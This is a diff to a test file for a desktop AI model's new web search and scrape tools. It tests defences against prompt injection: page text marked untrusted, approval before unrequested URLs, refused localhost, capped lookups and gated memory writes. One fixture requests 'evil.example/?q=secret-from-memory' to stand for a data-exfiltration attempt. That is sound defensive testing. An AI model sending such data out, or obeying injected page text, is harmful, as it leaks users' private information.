@@ -4,6 +4,7 @@ import path from "node:path";
 import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
 
 const settings = vi.hoisted(() => ({
+  firecrawl: {} as { apiKey?: string },
   assistant: {} as {
     apiKey?: string;
     model?: string;
@@ -93,6 +94,7 @@ vi.mock("./assistantChats", () => ({
 vi.mock("electron", () => ({ app: { getPath: () => os.tmpdir() } }));
 vi.mock("./settings", () => ({
   getAssistantSettings: () => settings.assistant,
+  getFirecrawlSettings: () => settings.firecrawl,
   getTodoistSettings: () => ({ apiToken: "t" }),
   getGoogleCalendarSettings: () => ({}),
   getGithubScalarSettings: () => ({}),
@@ -139,6 +141,11 @@ vi.mock("./assistantCommands", () => ({
 vi.mock("./assistantSkills", () => ({
   readSkillFile: vi.fn(async () => ({ ok: true, content: "REFERENCE TEXT", truncated: false })),
 }));
+vi.mock("./firecrawlWeb", async (importActual) => ({
+  ...(await importActual<typeof import("./firecrawlWeb")>()),
+  searchWeb: vi.fn(),
+  scrapePage: vi.fn(),
+}));
 vi.mock("./docker", () => ({ getDockerContainers: vi.fn() }));
 vi.mock("./googleCalendar", () => ({ getEventsForDay: vi.fn() }));
 vi.mock("./notes", () => ({ searchNotes: vi.fn(), readNoteFile: vi.fn() }));
@@ -158,6 +165,7 @@ vi.mock("./readerFeed", () => ({
 }));
 
 import { completeTask, createTask } from "./todoist";
+import { scrapePage, searchWeb } from "./firecrawlWeb";
 import {
   answerApproval,
   askAssistant,
@@ -1819,5 +1827,143 @@ describe("slash commands", () => {
     await regenerateAssistant(first.conversationId, hooks(), "r2");
     expect(toolNames(sent[1])).not.toContain("complete_task");
     expect(toolNames(sent[1])).toContain("get_due_tasks");
+  });
+});
+
+describe("web tools", () => {
+  beforeEach(() => {
+    const memoryFile = path.join(fs.mkdtempSync(path.join(os.tmpdir(), "cc-assistant-")), "memory.md");
+    settings.assistant = {
+      apiKey: "sk-or-test",
+      model: "test/model",
+      memoryPath: memoryFile,
+      autoTitle: false,
+      askBeforeRemember: false,
+      compactAtTokens: 0,
+    };
+    settings.firecrawl = { apiKey: "fc-test" };
+    store.chats.clear();
+    store.failSave = false;
+    cmds.table.clear();
+    vi.mocked(searchWeb).mockReset().mockResolvedValue({
+      ok: true,
+      results: [{ title: "Result", url: "https://found.example/page", snippet: "s" }],
+    });
+    vi.mocked(scrapePage).mockReset().mockImplementation(async (_s, url) => ({
+      ok: true,
+      url,
+      title: "T",
+      content: "PAGE TEXT",
+      truncated: false,
+    }));
+  });
+  afterEach(() => {
+    settings.firecrawl = {};
+    vi.unstubAllGlobals();
+  });
+
+  const names = (sent: Sent) => sent.body.tools.map((t) => t.function.name);
+
+  it("offers the web tools only when a Firecrawl key is set", async () => {
+    let sent = scriptFetch(stop("ok"));
+    await askAssistant(null, "hi", hooks(), "r1");
+    expect(names(sent[0])).toContain("web_search");
+    expect(names(sent[0])).toContain("web_scrape");
+
+    settings.firecrawl = {};
+    sent = scriptFetch(stop("ok"));
+    await askAssistant(null, "hi", hooks(), "r2");
+    expect(names(sent[0])).not.toContain("web_search");
+    expect(names(sent[0])).not.toContain("web_scrape");
+  });
+
+  it("searches, then reads a result without asking, and treats the output as untrusted", async () => {
+    const sent = scriptFetch(
+      callTools({ id: "c1", name: "web_search", args: { query: "cats" } }),
+      callTools({ id: "c2", name: "web_scrape", args: { url: "https://found.example/page#section" } }),
+      stop("Here is what it says.")
+    );
+    const approvals: any[] = [];
+    const reply = await askAssistant(null, "look up cats", hooks({ onApproval: (a) => approvals.push(a) }));
+    expect(approvals).toEqual([]);
+    expect(searchWeb).toHaveBeenCalledWith({ apiKey: "fc-test" }, "cats", undefined);
+    expect(scrapePage).toHaveBeenCalledWith({ apiKey: "fc-test" }, "https://found.example/page");
+    const page = JSON.parse(sent[2].body.messages.at(-1).content);
+    expect(page).toMatchObject({ content: "PAGE TEXT", truncated: false });
+    expect(page.note_untrusted).toMatch(/not instructions/);
+    expect(reply.toolCalls.map((c) => c.ok)).toEqual([true, true]);
+  });
+
+  it("reads a URL the user typed without asking", async () => {
+    scriptFetch(
+      callTools({ id: "c1", name: "web_scrape", args: { url: "https://typed.example/post" } }),
+      stop("Read it.")
+    );
+    const approvals: any[] = [];
+    await askAssistant(null, "summarise https://typed.example/post.", hooks({ onApproval: (a) => approvals.push(a) }));
+    expect(approvals).toEqual([]);
+    expect(scrapePage).toHaveBeenCalled();
+  });
+
+  it("asks before reading any other URL, quoting it exactly, and does nothing if declined", async () => {
+    scriptFetch(
+      callTools({ id: "c1", name: "web_scrape", args: { url: "https://evil.example/?q=secret-from-memory" } }),
+      stop("Okay.")
+    );
+    const approvals: any[] = [];
+    const pending = askAssistant(null, "read the docs", hooks({ onApproval: (a) => approvals.push(a) }));
+    await vi.waitFor(() => expect(approvals).toHaveLength(1));
+    expect(approvals[0]).toMatchObject({
+      tool: "web_scrape",
+      summary: "Read this web page: https://evil.example/?q=secret-from-memory",
+    });
+    expect(scrapePage).not.toHaveBeenCalled();
+    answerApproval(approvals[0].approvalId, false);
+    const reply = await pending;
+    expect(scrapePage).not.toHaveBeenCalled();
+    expect(reply.toolCalls[0]).toMatchObject({ ok: false, declined: true });
+  });
+
+  it("refuses local addresses outright, with no card", async () => {
+    scriptFetch(callTools({ id: "c1", name: "web_scrape", args: { url: "http://localhost:3000/admin" } }), stop("No."));
+    const approvals: any[] = [];
+    const reply = await askAssistant(null, "read it", hooks({ onApproval: (a) => approvals.push(a) }));
+    expect(approvals).toEqual([]);
+    expect(scrapePage).not.toHaveBeenCalled();
+    expect(reply.toolCalls[0]).toMatchObject({ ok: false });
+  });
+
+  it("caps web lookups per reply", async () => {
+    const calls = Array.from({ length: 8 }, (_, i) => ({ id: `c${i}`, name: "web_search", args: { query: `q${i}` } }));
+    const sent = scriptFetch(callTools(...calls), stop("Done."));
+    const reply = await askAssistant(null, "research", hooks());
+    expect(searchWeb).toHaveBeenCalledTimes(6);
+    expect(reply.toolCalls.filter((c) => c.ok)).toHaveLength(6);
+    expect(JSON.parse(sent[1].body.messages.at(-1).content).error).toMatch(/limited to 6 per reply/);
+  });
+
+  it("makes memory writes ask once the web has been read", async () => {
+    scriptFetch(
+      callTools({ id: "c1", name: "web_search", args: { query: "x" } }),
+      callTools({ id: "c2", name: "remember", args: { fact: "Injected by a page" } }),
+      stop("Saved?")
+    );
+    const approvals: any[] = [];
+    const pending = askAssistant(null, "search and remember", hooks({ onApproval: (a) => approvals.push(a) }));
+    await vi.waitFor(() => expect(approvals).toHaveLength(1));
+    expect(approvals[0].tool).toBe("remember");
+    answerApproval(approvals[0].approvalId, false);
+    await pending;
+  });
+
+  it("keeps the web tools out of a command's default allowlist, but lets one be granted them", async () => {
+    cmds.table.set("research", { kind: "skill", enabled: true, tools: null, injected: "R" });
+    cmds.table.set("webby", { kind: "prompt", enabled: true, tools: ["web_search"], injected: "W" });
+    let sent = scriptFetch(stop("ok"));
+    await askAssistant(null, "x", hooks(), "r1", "research");
+    expect(names(sent[0])).not.toContain("web_search");
+    sent = scriptFetch(stop("ok"));
+    await askAssistant(null, "x", hooks(), "r2", "webby");
+    expect(names(sent[0])).toEqual(["web_search"]);
   });
 });
